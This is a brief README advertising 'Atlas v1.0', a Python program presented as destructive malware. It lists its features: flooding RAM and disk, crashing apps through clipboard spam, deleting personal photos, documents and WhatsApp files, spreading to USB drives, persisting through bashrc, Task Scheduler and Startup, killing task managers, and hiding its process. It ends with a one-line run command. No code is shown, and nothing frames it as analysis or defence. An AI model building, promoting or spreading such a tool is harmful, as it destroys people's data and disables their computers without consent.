# Atlas v1.0
One-file apocalypse. No dependencies. No recovery.

## Features
- RAM flood (4GB chunks via mmap/VirtualAlloc)
- Disk flood (fills with `.sys_cache` — never auto-deletes)
- Clipboard spam (100MB base64 every 2s — crashes apps)
- Deletes personal files (Photos, Docs, Downloads, WhatsApp)
- Self-replicates to USB drives
- Persistence: bashrc, Task Scheduler, Startup
- Anti-kill: Kills taskmgr, htop, top
- Silent: renames process, hides

## Usage
```bash
python3 atlas.py
